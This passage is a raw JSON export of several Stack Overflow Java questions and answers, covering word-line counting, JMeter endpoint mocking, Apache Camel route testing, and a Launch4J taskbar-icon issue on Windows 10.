(myReader.hasNextLine()) {\r\n\t\t\tlineNumber++;\r\n\t\t\tString text = myReader.nextLine();\r\n\t\t\tif (text.isBlank()) {\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tfinal String lowerText = text.toLowerCase();\r\n\t\t\tfinal String[] split = lowerText.split(&quot;\\\\W+&quot;);\r\n\t\t\tfor (String word : split) {\r\n\t\t\t\tInteger count = wordToCount.get(word);\r\n\t\t\t\tif (count == null) {\r\n\t\t\t\t\tcount = 0;\r\n\t\t\t\t}\r\n\t\t\t\twordToCount.put(word, count + 1);\r\n\r\n\t\t\t\tSet&lt;Integer&gt; lines = wordToLines.get(word);\r\n\t\t\t\tif (lines == null) {\r\n\t\t\t\t\tlines = new TreeSet&lt;&gt;();\r\n\t\t\t\t\twordToLines.put(word, lines);\r\n\t\t\t\t}\r\n\t\t\t\tlines.add(lineNumber);\r\n\t\t\t}\r\n\t\t}\r\n\t\tmyReader.close();\r\n\r\n\t\tfor (String word : wordToCount.keySet()) {\r\n\t\t\tSet&lt;Integer&gt; lines = wordToLines.get(word);\r\n\t\t\tList&lt;String&gt; linesStrings = lines.stream().map(String::valueOf).toList();\r\n\t\t\tString linesStr = String.join(&quot;, &quot;, linesStrings);\r\n\t\t\tint wordCount = wordToCount.get(word);\r\n\t\t\tSystem.out.printf(&quot;%-20s %-3d %s\\n&quot;, word, wordCount, linesStr);\r\n\t\t}\r\n\t}\r\n}\r\n```","title":"How to check in which line of text the word is","body":"<p>Well, if you were allowed to use Maps, this is about how it would be done. Being very familiar and comfortable with how and when to use List, HashMap (aka dictionaries), and HashSet -- often in combination -- is one of the most fundamental skills in programming, in my opinion.</p>\n<pre><code>public class SO {\n    public static void main(String[] args) throws Exception {\n        Map&lt;String, Integer&gt; wordToCount = new HashMap&lt;&gt;();\n        Map&lt;String, Set&lt;Integer&gt;&gt; wordToLines = new HashMap&lt;&gt;();\n\n        File myObj = new File(&quot;path\\\\text.txt&quot;);\n        Scanner myReader = new Scanner(myObj);\n        int lineNumber = 0;\n        while (myReader.hasNextLine()) {\n            lineNumber++;\n            String text = myReader.nextLine();\n            if (text.isBlank()) {\n                continue;\n            }\n            final String lowerText = text.toLowerCase();\n            final String[] split = lowerText.split(&quot;\\\\W+&quot;);\n            for (String word : split) {\n                Integer count = wordToCount.get(word);\n                if (count == null) {\n                    count = 0;\n                }\n                wordToCount.put(word, count + 1);\n\n                Set&lt;Integer&gt; lines = wordToLines.get(word);\n                if (lines == null) {\n                    lines = new TreeSet&lt;&gt;();\n                    wordToLines.put(word, lines);\n                }\n                lines.add(lineNumber);\n            }\n        }\n        myReader.close();\n\n        for (String word : wordToCount.keySet()) {\n            Set&lt;Integer&gt; lines = wordToLines.get(word);\n            List&lt;String&gt; linesStrings = lines.stream().map(String::valueOf).toList();\n            String linesStr = String.join(&quot;, &quot;, linesStrings);\n            int wordCount = wordToCount.get(word);\n            System.out.printf(&quot;%-20s %-3d %s\\n&quot;, word, wordCount, linesStr);\n        }\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":16181723,"reputation":29,"user_id":17489710,"display_name":"Miguel Rodrigues"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":258,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70732117,"answer_count":2,"score":1,"last_activity_date":1642485853,"creation_date":1642350384,"question_id":70731944,"body_markdown":"I&#39;m doing an exercise where I need to count how many times a word appears on a text and I also need to print in which line the words are present. \r\n\r\nText example: \r\n\r\n&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. \r\nUt enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. \r\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.\r\nExcepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\r\n\r\nThis is my method to find and count every word:\r\n\r\n    public void findWords() {\r\n        try {\r\n            File myObj = new File(&quot;path\\\\text.txt&quot;);\r\n            Scanner myReader = new Scanner(myObj);\r\n            while (myReader.hasNextLine()) {\r\n                String text = myReader.nextLine();\r\n                final String lowerText = text.toLowerCase();\r\n                final String[] split = lowerText.split(&quot;\\\\W+&quot;);\r\n                System.out.println(&quot;Output: &quot;);\r\n                for (String s : split) {\r\n                    if (s == null) {\r\n                        continue;\r\n                    }\r\n                    int count = 0;\r\n                    for (int i = 0; i &lt; split.length; i++) {\r\n                        final boolean sameWorld = s.equals(split[i]);\r\n                        if (sameWorld) {\r\n                            count = count + 1;\r\n                            split[i] = null;\r\n                        }\r\n                    }\r\n                    System.out.println(s + &quot; &quot; + count);\r\n                }\r\n            }\r\n            myReader.close();\r\n        } catch (FileNotFoundException e) {\r\n            System.out.println(e);\r\n        }\r\n    }\r\n\r\nThe current output is something like this: \r\n\r\n    Output:\r\n    lorem 1\r\n    ipsum 1\r\n    dolor 1\r\n    sit 1\r\n    amet 1\r\n    consectetur 1\r\n    adipiscing 1\r\n    ....\r\n\r\nAnd I want it to show in which line the word is like:\r\n\r\n    Output:\r\n    lorem 1 - line 1\r\n    ipsum 1 - line 1\r\n    ...\r\n\r\nTo make it clearer, the word &quot;ut&quot; appears 3 times in 2 different lines and the output should look like this: \r\n\r\n     ut 3 - line 1 2","title":"How to check in which line of text the word is","body":"<p>I'm doing an exercise where I need to count how many times a word appears on a text and I also need to print in which line the words are present.</p>\n<p>Text example:</p>\n<blockquote>\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\nUt enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.\nExcepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\n</blockquote>\n<p>This is my method to find and count every word:</p>\n<pre><code>public void findWords() {\n    try {\n        File myObj = new File(&quot;path\\\\text.txt&quot;);\n        Scanner myReader = new Scanner(myObj);\n        while (myReader.hasNextLine()) {\n            String text = myReader.nextLine();\n            final String lowerText = text.toLowerCase();\n            final String[] split = lowerText.split(&quot;\\\\W+&quot;);\n            System.out.println(&quot;Output: &quot;);\n            for (String s : split) {\n                if (s == null) {\n                    continue;\n                }\n                int count = 0;\n                for (int i = 0; i &lt; split.length; i++) {\n                    final boolean sameWorld = s.equals(split[i]);\n                    if (sameWorld) {\n                        count = count + 1;\n                        split[i] = null;\n                    }\n                }\n                System.out.println(s + &quot; &quot; + count);\n            }\n        }\n        myReader.close();\n    } catch (FileNotFoundException e) {\n        System.out.println(e);\n    }\n}\n</code></pre>\n<p>The current output is something like this:</p>\n<pre><code>Output:\nlorem 1\nipsum 1\ndolor 1\nsit 1\namet 1\nconsectetur 1\nadipiscing 1\n....\n</code></pre>\n<p>And I want it to show in which line the word is like:</p>\n<pre><code>Output:\nlorem 1 - line 1\nipsum 1 - line 1\n...\n</code></pre>\n<p>To make it clearer, the word &quot;ut&quot; appears 3 times in 2 different lines and the output should look like this:</p>\n<pre><code> ut 3 - line 1 2\n</code></pre>\n"},{"tags":["java","api","jmeter","wiremock"],"comments":[{"owner":{"account_id":9847991,"reputation":56906,"user_id":7294900,"accept_rate":94,"display_name":"Ori Marko"},"score":0,"creation_date":1642441760,"post_id":70745105,"comment_id":125066631,"body_markdown":"See similar question https://stackoverflow.com/questions/49129938/can-jmeter-mock-http-request","body":"See similar question <a href=\"https://stackoverflow.com/questions/49129938/can-jmeter-mock-http-request\" title=\"can jmeter mock http request\">stackoverflow.com/questions/49129938/&hellip;</a>"},{"owner":{"account_id":23968051,"reputation":1,"user_id":17957220,"display_name":"curiousCat"},"score":0,"creation_date":1642442147,"post_id":70745105,"comment_id":125066734,"body_markdown":"Does using wireMock apply to JMS publisher as well?","body":"Does using wireMock apply to JMS publisher as well?"}],"answers":[{"tags":[],"owner":{"account_id":3460456,"reputation":162728,"user_id":2897748,"display_name":"Dmitri T"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642485585,"creation_date":1642485585,"answer_id":70750930,"question_id":70745105,"body_markdown":"We don&#39;t know what kind of &quot;API&quot; endpoints are being &quot;called&quot; and what protocols are in scope hence we cannot come up with a comprehensive solution. \r\n\r\n- Well-behaved and well-developed systems should allow simple configuration switch which would return a dummy response from an &quot;API endpoint&quot; whatever it means. If it&#39;s not the case - I doubt that it makes sense to conduct performance testing because given bad initial architecture I assume that it won&#39;t handle even several concurrent threads. \r\n - If you need to just pretend that some endpoint returns something to JMeter - go for [Dummy Sampler][1] \r\n - A very simple HTTP mock response can be supplied using JMeter&#39;s built-in [HTTP Mirror Server][2]\r\n - More comprehensive solution would be using a dedicated mocking tool like [WireMock][3]\r\n - If you need to supply a fully functional mock of a JMS endpoint (a real queue or topic) - check out [Mocking JMS infrastructure with MockRunner to favour testing][4] article\r\n  \r\n\r\n\r\n  [1]: https://www.blazemeter.com/blog/jmeters-dummy-sampler-the-ultimate-guide/\r\n  [2]: https://jmeter.apache.org/usermanual/component_reference.html#HTTP_Mirror_Server\r\n  [3]: http://wiremock.org/\r\n  [4]: https://dzone.com/articles/mocking-jms-infrastructure","title":"How to mock service calls Jmeter when using Jms publisher?","body":"<p>We don't know what kind of &quot;API&quot; endpoints are being &quot;called&quot; and what protocols are in scope hence we cannot come up with a comprehensive solution.</p>\n<ul>\n<li>Well-behaved and well-developed systems should allow simple configuration switch which would return a dummy response from an &quot;API endpoint&quot; whatever it means. If it's not the case - I doubt that it makes sense to conduct performance testing because given bad initial architecture I assume that it won't handle even several concurrent threads.</li>\n<li>If you need to just pretend that some endpoint returns something to JMeter - go for <a href=\"https://www.blazemeter.com/blog/jmeters-dummy-sampler-the-ultimate-guide/\" rel=\"nofollow noreferrer\">Dummy Sampler</a></li>\n<li>A very simple HTTP mock response can be supplied using JMeter's built-in <a href=\"https://jmeter.apache.org/usermanual/component_reference.html#HTTP_Mirror_Server\" rel=\"nofollow noreferrer\">HTTP Mirror Server</a></li>\n<li>More comprehensive solution would be using a dedicated mocking tool like <a href=\"http://wiremock.org/\" rel=\"nofollow noreferrer\">WireMock</a></li>\n<li>If you need to supply a fully functional mock of a JMS endpoint (a real queue or topic) - check out <a href=\"https://dzone.com/articles/mocking-jms-infrastructure\" rel=\"nofollow noreferrer\">Mocking JMS infrastructure with MockRunner to favour testing</a> article</li>\n</ul>\n"}],"owner":{"account_id":23968051,"reputation":1,"user_id":17957220,"display_name":"curiousCat"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":227,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642485585,"creation_date":1642439604,"question_id":70745105,"body_markdown":"I have a Jmeter script that has a JMS publisher to send a payload to an activeMQ queue. When the message is sent to this queue, it goes through the flow and calls different endpoints. I want to be able to mock one of these API endpoints so that when it&#39;s called, it will just give generic response with 1 second delay instead of errors or repeating the same call. \r\n\r\nIs there any way to achieve this?","title":"How to mock service calls Jmeter when using Jms publisher?","body":"<p>I have a Jmeter script that has a JMS publisher to send a payload to an activeMQ queue. When the message is sent to this queue, it goes through the flow and calls different endpoints. I want to be able to mock one of these API endpoints so that when it's called, it will just give generic response with 1 second delay instead of errors or repeating the same call.</p>\n<p>Is there any way to achieve this?</p>\n"},{"tags":["java","unit-testing","testing","apache-camel"],"comments":[{"owner":{"account_id":1464652,"reputation":12323,"user_id":1377895,"accept_rate":100,"display_name":"Roman Vottner"},"score":0,"creation_date":1433116856,"post_id":30563578,"comment_id":49199078,"body_markdown":"You could try to [intercept](http://camel.apache.org/intercept.html) the bean invocations or [advice](http://camel.apache.org/advicewith.html) your root and add certain mock-endpoints after each bean-method invocation","body":"You could try to <a href=\"http://camel.apache.org/intercept.html\" rel=\"nofollow noreferrer\">intercept</a> the bean invocations or <a href=\"http://camel.apache.org/advicewith.html\" rel=\"nofollow noreferrer\">advice</a> your root and add certain mock-endpoints after each bean-method invocation"},{"owner":{"account_id":4397924,"reputation":1317,"user_id":3584420,"accept_rate":70,"display_name":"soilworker"},"score":0,"creation_date":1433149960,"post_id":30563578,"comment_id":49209598,"body_markdown":"You can also write some unit tests, see http://camel.apache.org/testing.html, to test your route.","body":"You can also write some unit tests, see <a href=\"http://camel.apache.org/testing.html\" rel=\"nofollow noreferrer\">camel.apache.org/testing.html</a>, to test your route."}],"answers":[{"tags":[],"owner":{"account_id":2913002,"reputation":790,"user_id":2496830,"accept_rate":67,"display_name":"Ramin Arabbagheri"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1433200905,"creation_date":1433200175,"answer_id":30584801,"question_id":30563578,"body_markdown":"You can simply &quot;advice&quot; your route and add mocks to each choice of your content-based router\r\n\r\n    public void testAdvised() throws Exception {\r\n        // advice the first route using the inlined route builder\r\n        context.getRouteDefinition(&quot;Actions&quot;).adviceWith(context, new RouteBuilder() {\r\n            @Override\r\n            public void configure() throws Exception {\r\n                replaceFromWith(&quot;direct:start&quot;);\r\n                weaveByToString(&quot;.*method1.*&quot;).after().to(&quot;mock:choice1&quot;);\r\n                weaveByToString(&quot;.*method2.*&quot;).after().to(&quot;mock:choice2&quot;);\r\n            }\r\n        });\r\n \r\n        getMockEndpoint(&quot;mock:choice1&quot;).expectedMessageCount(1);\r\n        getMockEndpoint(&quot;mock:choice2&quot;).expectedMessageCount(0);\r\n \r\n        template.sendBody(&quot;direct:start&quot;, &quot;Hello World&quot;);\r\n \r\n        assertMockEndpointsSatisfied();\r\n    }\r\n\r\nThis probably needs a little more modifications to get it working. Let me know if you needed more clarification or a proper real test scenario for your route.","title":"Can anyone tell me how to test my Camel Route if I have a choice operation?","body":"<p>You can simply \"advice\" your route and add mocks to each choice of your content-based router</p>\n\n<pre><code>public void testAdvised() throws Exception {\n    // advice the first route using the inlined route builder\n    context.getRouteDefinition(\"Actions\").adviceWith(context, new RouteBuilder() {\n        @Override\n        public void configure() throws Exception {\n            replaceFromWith(\"direct:start\");\n            weaveByToString(\".*method1.*\").after().to(\"mock:choice1\");\n            weaveByToString(\".*method2.*\").after().to(\"mock:choice2\");\n        }\n    });\n\n    getMockEndpoint(\"mock:choice1\").expectedMessageCount(1);\n    getMockEndpoint(\"mock:choice2\").expectedMessageCount(0);\n\n    template.sendBody(\"direct:start\", \"Hello World\");\n\n    assertMockEndpointsSatisfied();\n}\n</code></pre>\n\n<p>This probably needs a little more modifications to get it working. Let me know if you needed more clarification or a proper real test scenario for your route.</p>\n"},{"tags":[],"owner":{"account_id":6205399,"reputation":25,"user_id":4833600,"display_name":"Shashank shekhar Dubey"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1642485522,"creation_date":1642485522,"answer_id":70750919,"question_id":30563578,"body_markdown":"I had a similar problem but in my case there was a predicate with `when` which would decide upon further action. It is not same as what is asked here, but I am still answering as it may help someone like me who is looking for it and comes to this page. \r\n\r\nThe route to be tested is:\r\n\r\n    from(&quot;direct:start&quot;).routeId(&quot;route1&quot;)\r\n\t  .choice()\r\n\t    .when(pred)  //pred is some predicate\r\n\t      .to(&quot;log:choiceTrue&quot;)\r\n\t    //.to(&lt;some other route&gt;)\r\n\t  .otherwise()\r\n\t      .to(&quot;log:choiceFalse&quot;)\r\n\t    //.to(&lt;some other route&gt;)\r\n\t  .end()\r\n\t.end();\r\n\r\nSince I was unable to mock the predicate to make it true or false as per my test condition, I replaced the entire choice segment with another similar route. For that I had to add a choice Id. Below is the entire code snippet.\r\n\r\n    public class PredicateTest extends CamelTestSupport{\r\n\r\n\tprotected RoutesBuilder createRouteBuilder() {\r\n\t\treturn new RouteBuilder() {\r\n\r\n\t\t\tPredicate pred = exchangeProperty(&quot;sfs&quot;).isEqualTo(&quot;sdf&quot;);\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void configure() throws Exception {\r\n\t\t\t\tfrom(&quot;direct:start&quot;).routeId(&quot;route1&quot;)\r\n\t\t\t    .choice().id(&quot;choiceId&quot;)\r\n\t\t\t       .when(pred)  //pred is some predicate\r\n\t\t\t          .to(&quot;log:choiceTrue&quot;)\r\n\t\t\t        //.to(&lt;some other route&gt;)\r\n\t\t\t    .otherwise()\r\n\t\t\t          .to(&quot;log:choiceFalse&quot;)\r\n\t\t\t        //.to(&lt;some other route&gt;)\r\n\t\t\t    .end()\r\n\t\t\t    .end();\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\tfrom(&quot;direct:diversion&quot;)\r\n\t\t\t\t.to(&quot;log:divertedRoute&quot;)\r\n\t\t\t\t.choice()\r\n\t\t\t\t\t.when().simple(&quot;&#39;abc&#39; == &#39;abc&#39;&quot;) //true condition\r\n\t\t\t\t\t\t.to(&quot;log:TrueDiversion&quot;)\r\n\t\t\t\t\t\t//.to(&lt;some other route&gt;)\r\n\t\t\t\t.otherwise()\r\n\t\t\t\t\t\t.to(&quot;log:FalseDiversion&quot;)\r\n\t\t\t\t\t\t//.to(&lt;some other route&gt;)\r\n\t\t\t\t.end()\r\n\t\t\t\t.end();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t};\r\n\t}\r\n    @Test\r\n    public void testMocksAreValid() throws Exception{\r\n\t\t\r\n      RouteDefinition routeDef = context.getRouteDefinition(&quot;route1&quot;);\r\n\t\t\r\n        AdviceWith.adviceWith(routeDef, context,\r\n\t\t\t\tnew AdviceWithRouteBuilder() {\r\n\t\t\t\t\t\r\n                    @Override\r\n                    public void configure() throws Exception {\r\n                       weaveById(&quot;choiceId&quot;).replace()\r\n                                            .to(&quot;direct:diversion&quot;);\r\n                       weaveAddLast().to(&quot;mock:mockendpoint&quot;);\r\n                    }\r\n                });\r\n\t\t\r\n        context.start();\r\n        template.requestBody(&quot;direct:start&quot;, &quot;sampleBody&quot;);\r\n        \r\n        MockEndpoint mock = getMockEndpoint(&quot;mock:mockendpoint&quot;);\r\n\t\tmock.expectedMessageCount(1);\r\n\t\t\r\n\t\tmock.assertIsSatisfied();\r\n      }\r\n    }\r\n\r\nObviously, the commented `&lt;some other route&gt;` would be same in the `start` as well as `diversion` routes for the correct tests.","title":"Can anyone tell me how to test my Camel Route if I have a choice operation?","body":"<p>I had a similar problem but in my case there was a predicate with <code>when</code> which would decide upon further action. It is not same as what is asked here, but I am still answering as it may help someone like me who is looking for it and comes to this page.</p>\n<p>The route to be tested is:</p>\n<pre><code>from(&quot;direct:start&quot;).routeId(&quot;route1&quot;)\n  .choice()\n    .when(pred)  //pred is some predicate\n      .to(&quot;log:choiceTrue&quot;)\n    //.to(&lt;some other route&gt;)\n  .otherwise()\n      .to(&quot;log:choiceFalse&quot;)\n    //.to(&lt;some other route&gt;)\n  .end()\n.end();\n</code></pre>\n<p>Since I was unable to mock the predicate to make it true or false as per my test condition, I replaced the entire choice segment with another similar route. For that I had to add a choice Id. Below is the entire code snippet.</p>\n<pre><code>public class PredicateTest extends CamelTestSupport{\n\nprotected RoutesBuilder createRouteBuilder() {\n    return new RouteBuilder() {\n\n        Predicate pred = exchangeProperty(&quot;sfs&quot;).isEqualTo(&quot;sdf&quot;);\n        \n        @Override\n        public void configure() throws Exception {\n            from(&quot;direct:start&quot;).routeId(&quot;route1&quot;)\n            .choice().id(&quot;choiceId&quot;)\n               .when(pred)  //pred is some predicate\n                  .to(&quot;log:choiceTrue&quot;)\n                //.to(&lt;some other route&gt;)\n            .otherwise()\n                  .to(&quot;log:choiceFalse&quot;)\n                //.to(&lt;some other route&gt;)\n            .end()\n            .end();\n            \n            \n            from(&quot;direct:diversion&quot;)\n            .to(&quot;log:divertedRoute&quot;)\n            .choice()\n                .when().simple(&quot;'abc' == 'abc'&quot;) //true condition\n                    .to(&quot;log:TrueDiversion&quot;)\n                    //.to(&lt;some other route&gt;)\n            .otherwise()\n                    .to(&quot;log:FalseDiversion&quot;)\n                    //.to(&lt;some other route&gt;)\n            .end()\n            .end();\n        }\n        \n    };\n}\n@Test\npublic void testMocksAreValid() throws Exception{\n    \n  RouteDefinition routeDef = context.getRouteDefinition(&quot;route1&quot;);\n    \n    AdviceWith.adviceWith(routeDef, context,\n            new AdviceWithRouteBuilder() {\n                \n                @Override\n                public void configure() throws Exception {\n                   weaveById(&quot;choiceId&quot;).replace()\n                                        .to(&quot;direct:diversion&quot;);\n                   weaveAddLast().to(&quot;mock:mockendpoint&quot;);\n                }\n            });\n    \n    context.start();\n    template.requestBody(&quot;direct:start&quot;, &quot;sampleBody&quot;);\n    \n    MockEndpoint mock = getMockEndpoint(&quot;mock:mockendpoint&quot;);\n    mock.expectedMessageCount(1);\n    \n    mock.assertIsSatisfied();\n  }\n}\n</code></pre>\n<p>Obviously, the commented <code>&lt;some other route&gt;</code> would be same in the <code>start</code> as well as <code>diversion</code> routes for the correct tests.</p>\n"}],"owner":{"account_id":4137388,"reputation":338,"user_id":3393720,"accept_rate":83,"display_name":"Gautham Honnavara"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1905,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":30584801,"answer_count":2,"score":1,"last_activity_date":1642485522,"creation_date":1433113204,"question_id":30563578,"body_markdown":"I have a Camel route that has implemented a Content based Routing EIP(Choice operation). I need to test it. I&#39;m new to Camel. So, I&#39;m unsure how to do it.\r\nCan anyone tell me how to test this operation. I have mentioned a sample code below that has to be tested.\r\n\r\n    public void configure() throws Exception \r\n    {   \r\n        onException(Exception.class).handled(true).bean(ErrorHandler.class).stop();\r\n      \r\n    \tfrom(&quot;{{input}}?concurrentConsumers=10&quot;)\r\n    \t.routeId(&quot;Actions&quot;)\r\n\t        .choice()\r\n\t\t\t\t.when().simple(&quot;${header.Action} == ${type:status1}&quot;)\r\n\t\t\t\t\t.bean(Class, &quot;method1&quot;)\r\n\t\t\t\t.when().simple(&quot;${header.Action} == ${type:status2}&quot;)\r\n\t\t\t\t\t.bean(Class, &quot;method2&quot;)\r\n\t\t\t\t.when().simple(&quot;${header.Action} == ${type:status3}&quot;)\r\n\t\t\t\t\t.bean(Class, &quot;method3&quot;)\r\n\t\t\t\t.otherwise()\r\n\t\t\t\t    .bean(Class, &quot;method4&quot;)\r\n\t\t\t.end();       \r\n    }","title":"Can anyone tell me how to test my Camel Route if I have a choice operation?","body":"<p>I have a Camel route that has implemented a Content based Routing EIP(Choice operation). I need to test it. I'm new to Camel. So, I'm unsure how to do it.\nCan anyone tell me how to test this operation. I have mentioned a sample code below that has to be tested.</p>\n\n<pre><code>public void configure() throws Exception \n{   \n    onException(Exception.class).handled(true).bean(ErrorHandler.class).stop();\n\n    from(\"{{input}}?concurrentConsumers=10\")\n    .routeId(\"Actions\")\n        .choice()\n            .when().simple(\"${header.Action} == ${type:status1}\")\n                .bean(Class, \"method1\")\n            .when().simple(\"${header.Action} == ${type:status2}\")\n                .bean(Class, \"method2\")\n            .when().simple(\"${header.Action} == ${type:status3}\")\n                .bean(Class, \"method3\")\n            .otherwise()\n                .bean(Class, \"method4\")\n        .end();       \n}\n</code></pre>\n"},{"tags":["java","windows","swing"],"comments":[{"owner":{"account_id":114128,"reputation":50422,"user_id":300257,"accept_rate":89,"display_name":"Gilbert Le Blanc"},"score":0,"creation_date":1642412201,"post_id":70739116,"comment_id":125054873,"body_markdown":"My guess, and it&#39;s only a guess because you haven&#39;t provided a [mre] showing us your code, is that your application has two `JFrames`, or that the first icon is the launcher and the second is your application.  Eclipse has a launcher icon and a separate application icon, as one example.","body":"My guess, and it&#39;s only a guess because you haven&#39;t provided a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> showing us your code, is that your application has two <code>JFrames</code>, or that the first icon is the launcher and the second is your application.  Eclipse has a launcher icon and a separate application icon, as one example."},{"owner":{"account_id":7423601,"reputation":18712,"user_id":5646962,"display_name":"Thomas Kl&#228;ger"},"score":0,"creation_date":1642415068,"post_id":70739116,"comment_id":125055998,"body_markdown":"The NSI file creates the installer - but the installer is not relevant for your question. The question is how you build the exe file using launch4j.","body":"The NSI file creates the installer - but the installer is not relevant for your question. The question is how you build the exe file using launch4j."},{"owner":{"account_id":27431,"reputation":46856,"user_id":72437,"accept_rate":86,"display_name":"Cheok Yan Cheng"},"score":0,"creation_date":1642484959,"post_id":70739116,"comment_id":125075950,"body_markdown":"@ThomasKl&#228;ger U r right. I am confusing myself. I am using Launch4J to build the EXE. I have updated my question.","body":"@ThomasKl&#228;ger U r right. I am confusing myself. I am using Launch4J to build the EXE. I have updated my question."}],"owner":{"account_id":27431,"reputation":46856,"user_id":72437,"accept_rate":86,"display_name":"Cheok Yan Cheng"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":103,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642484921,"creation_date":1642411805,"question_id":70739116,"body_markdown":"I have a Java desktop application developed using Swing, and deployed using Launch4J.\r\n\r\nIf I pin the Java desktop application to Windows 10 taskbar, and then launch it, the app is not opening in place on the taskbar. To illustrate the problem, this is how it looks like.\r\n\r\nThere are 2 icons appear in Taskbar. 1 icon for launcher, another icon for current active running app\r\n-----------------------------------\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n----------\r\n\r\n\r\nI expect there should be only 1 icon. This is how the pinned app Netbeans look like, if it is launched.\r\n\r\nOnly 1 icon appears in Taskbar. 1 icon for both launcher and current active running app\r\n------------------------------\r\n\r\n[![enter image description here][2]][2]\r\n\r\n\r\n----------\r\n\r\n**Do you have idea what goes wrong with my Java Swing application deployment? Why 2 icons are being shown on the taskbar?**\r\n\r\nI am using Launch4J (http://launch4j.sourceforge.net/) to build the EXE via the following XML file.\r\n\r\n    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n    &lt;launch4jConfig&gt;\r\n      &lt;dontWrapJar&gt;false&lt;/dontWrapJar&gt;\r\n      &lt;headerType&gt;gui&lt;/headerType&gt;\r\n      &lt;jar&gt;c:\\yocto\\jstock\\dist\\jstock.jar&lt;/jar&gt;\r\n      &lt;outfile&gt;c:\\yocto\\jstock\\installer\\windows\\jstock.exe&lt;/outfile&gt;\r\n      &lt;errTitle&gt;&lt;/errTitle&gt;\r\n      &lt;cmdLine&gt;&lt;/cmdLine&gt;\r\n      &lt;chdir&gt;&lt;/chdir&gt;\r\n      &lt;priority&gt;normal&lt;/priority&gt;\r\n      &lt;downloadUrl&gt;http://java.com/download&lt;/downloadUrl&gt;\r\n      &lt;supportUrl&gt;&lt;/supportUrl&gt;\r\n      &lt;stayAlive&gt;false&lt;/stayAlive&gt;\r\n      &lt;restartOnCrash&gt;false&lt;/restartOnCrash&gt;\r\n      &lt;manifest&gt;&lt;/manifest&gt;\r\n      &lt;icon&gt;c:\\yocto\\jstock\\installer\\windows\\chart.ico&lt;/icon&gt;\r\n      &lt;jre&gt;\r\n        &lt;path&gt;&lt;/path&gt;\r\n        &lt;bundledJre64Bit&gt;false&lt;/bundledJre64Bit&gt;\r\n        &lt;bundledJreAsFallback&gt;false&lt;/bundledJreAsFallback&gt;\r\n        &lt;minVersion&gt;1.7.0&lt;/minVersion&gt;\r\n        &lt;maxVersion&gt;&lt;/maxVersion&gt;\r\n        &lt;jdkPreference&gt;preferJre&lt;/jdkPreference&gt;\r\n        &lt;runtimeBits&gt;64/32&lt;/runtimeBits&gt;\r\n        &lt;initialHeapSize&gt;64&lt;/initialHeapSize&gt;\r\n        &lt;maxHeapSize&gt;512&lt;/maxHeapSize&gt;\r\n        &lt;opt&gt;-Dsun.java2d.dpiaware=false&lt;/opt&gt;\r\n      &lt;/jre&gt;\r\n      &lt;versionInfo&gt;\r\n        &lt;fileVersion&gt;1.1.8.5&lt;/fileVersion&gt;\r\n        &lt;txtFileVersion&gt;1.1.8.5&lt;/txtFileVersion&gt;\r\n        &lt;fileDescription&gt;JStock - Stock Market Software&lt;/fileDescription&gt;\r\n        &lt;copyright&gt;Yan Cheng Cheok &amp;lt;yancheng.cheok@gmail.com&amp;gt;&lt;/copyright&gt;\r\n        &lt;productVersion&gt;1.1.8.5&lt;/productVersion&gt;\r\n        &lt;txtProductVersion&gt;1.1.8.5&lt;/txtProductVersion&gt;\r\n        &lt;productName&gt;JStock - Stock Market Software&lt;/productName&gt;\r\n        &lt;companyName&gt;Yan Cheng Cheok &amp;lt;yancheng.cheok@gmail.com&amp;gt;&lt;/companyName&gt;\r\n        &lt;internalName&gt;jstock&lt;/internalName&gt;\r\n        &lt;originalFilename&gt;jstock.exe&lt;/originalFilename&gt;\r\n        &lt;trademarks&gt;&lt;/trademarks&gt;\r\n        &lt;language&gt;ENGLISH_US&lt;/language&gt;\r\n      &lt;/versionInfo&gt;\r\n    &lt;/launch4jConfig&gt;\r\n\r\n  [1]: https://i.stack.imgur.com/5Yw6A.png\r\n  [2]: https://i.stack.imgur.com/jvgLa.png","title":"Why Java Swing Pinned Apps Not Opening In Place On The Taskbar In Windows 10?","body":"<p>I have a Java desktop application developed using Swing, and deployed using Launch4J.</p>\n<p>If I pin the Java desktop application to Windows 10 taskbar, and then launch it, the app is not opening in place on the taskbar. To illustrate the problem, this is how it looks like.</p>\n<h2>There are 2 icons appear in Taskbar. 1 icon for launcher, another icon for current active running app</h2>\n<p><a href=\"https://i.stack.imgur.com/5Yw6A.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/5Yw6A.png\" 